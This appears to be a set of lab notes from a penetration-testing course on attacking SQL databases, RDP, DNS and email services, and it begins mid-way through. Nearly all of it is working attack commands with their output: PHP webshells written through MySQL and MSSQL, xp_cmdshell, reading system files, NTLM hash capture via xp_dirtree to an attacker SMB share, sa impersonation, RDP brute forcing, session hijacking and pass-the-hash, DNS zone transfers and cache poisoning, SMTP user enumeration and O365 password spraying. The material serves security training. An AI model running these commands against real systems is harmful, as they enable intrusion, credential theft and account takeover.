[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```
```
Attacking SQL Databases
mdmithu@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```
```
Show Databases
  Attacking SQL Databases
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```
```
Attacking SQL Databases
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbuser
```
```
Select a Database
  Attacking SQL Databases
mysql> USE htbusers;

Database changed
```
```
Attacking SQL Databases
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```
```
Show Tables
  Attacking SQL Databases
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```
```
Attacking SQL Databases
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```
```
Select all Data from Table "users"
  Attacking SQL Databases
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```
```
Attacking SQL Databases
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```
```
XP_CMDSHELL
  Attacking SQL Databases
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```
```
MySQL - Write Local File
  Attacking SQL Databases
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
```
MySQL - Secure File Privileges
  Attacking SQL Databases
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

```
```
MSSQL - Enable Ole Automation Procedures
  Attacking SQL Databases
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
```
MSSQL - Create a File
  Attacking SQL Databases
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
```
Read Local Files in MSSQL
  Attacking SQL Databases
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```
```
MySQL - Read Local Files in MySQL
  Attacking SQL Databases
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

```
```
XP_DIRTREE Hash Stealing
  Attacking SQL Databases
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```
```
XP_SUBDIRS Hash Stealing
  Attacking SQL Databases
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```
```
Attacking SQL Databases
mdmithu@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```
```
XP_SUBDIRS Hash Stealing with impacket
  Attacking SQL Databases
mdmithu@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```
```
Identify Users that We Can Impersonate
  Attacking SQL Databases
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```
```
Verifying our Current User and Role
  Attacking SQL Databases
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```
```
Impersonating the SA User
  Attacking SQL Databases
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
```
Identify linked Servers in MSSQL
  Attacking SQL Databases
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```
```
  Attacking SQL Databases
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```
## Attacking RDP

```
[!bash!]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```
```
Attacking RDP
mdmithu@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```
```
Attacking RDP
mdmithu@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```
```
Attacking RDP
mdmithu@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

```
RDP Login
  Attacking RDP
mdmithu@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```
```
Attacking RDP
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
```
Attacking RDP
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```
```
Attacking RDP
C:\htb> net start sessionhijack
```
```
Adding the DisableRestrictedAdmin Registry Key
  Attacking RDP
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```
Attacking RDP
mdmithu@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

```
## Attacking DNS

```
Attacking DNS
mdmithu@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```
```
DIG - AXFR Zone Transfer
  Attacking DNS
mdmithu@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```
```
Attacking DNS
mdmithu@htb[/htb]# fierce --domain zonetransfer.me

NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n'
               '@ 7200 IN A 5.196.105.14\n'
               '@ 7200 IN NS nsztm1.digi.ninja.\n'
               '@ 7200 IN NS nsztm2.digi.ninja.',
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
 <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
                                       'www',
 <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
 <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
 <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
 <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
 <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
 <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
 <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
 <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
 <DNS name home>: 'home 7200 IN A 127.0.0.1',
 <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
 <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
 <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',
 <DNS name office>: 'office 7200 IN A 4.23.39.254',
 <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
                            '2001:67c:2e8:11::c100:1332',
...SNIP...
```
```
Attacking DNS
mdmithu@htb[/htb]# ./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```
```
Subbrute
  Attacking DNS
mdmithu@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
mdmithu@htb[/htb]$ cd subbrute
mdmithu@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
mdmithu@htb[/htb]$ ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```
```
Attacking DNS
mdmithu@htb[/htb]# host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```
#### Local DNS Cache Poisoning
From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.

To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
```
Attacking DNS
mdmithu@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```
Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
```
Attacking DNS
C:\>ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.225.110:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
## Attacking Email Services

```
Host - MX Records
  Attacking Email Services
mdmithu@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```
```
Attacking Email Services
mdmithu@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```
```
DIG - MX Records
  Attacking Email Services
mdmithu@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
```
```
Attacking Email Services
mdmithu@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```
```
Host - A Records
  Attacking Email Services
mdmithu@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```
```
Port	          Service
TCP/25	        SMTP Unencrypted
TCP/143	        IMAP4 Unencrypted
TCP/110	        POP3 Unencrypted
TCP/465	        SMTP Encrypted
TCP/587	        SMTP Encrypted/STARTTLS
TCP/993	        IMAP4 Encrypted
TCP/995	        POP3 Encrypted
```
```
Attacking Email Services
mdmithu@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```
```
VRFY Command
  Attacking Email Services
mdmithu@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```
```
EXPN Command
  Attacking Email Services
mdmithu@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```
```
RCPT TO Command
  Attacking Email Services
mdmithu@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```
```
USER Command
  Attacking Email Services
mdmithu@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```
```
Attacking Email Services
mdmithu@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```
```
O365 Spray
  Attacking Email Services
mdmithu@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```
```
Attacking Email Services
mdmithu@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```
```
Hydra - Password Attack
  Attacking Email Services
mdmithu@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```
```
O365 Spray - Password Spraying
  Attacking Email Services
mdmithu@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```
```
Attacking Email Services
mdmithu@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

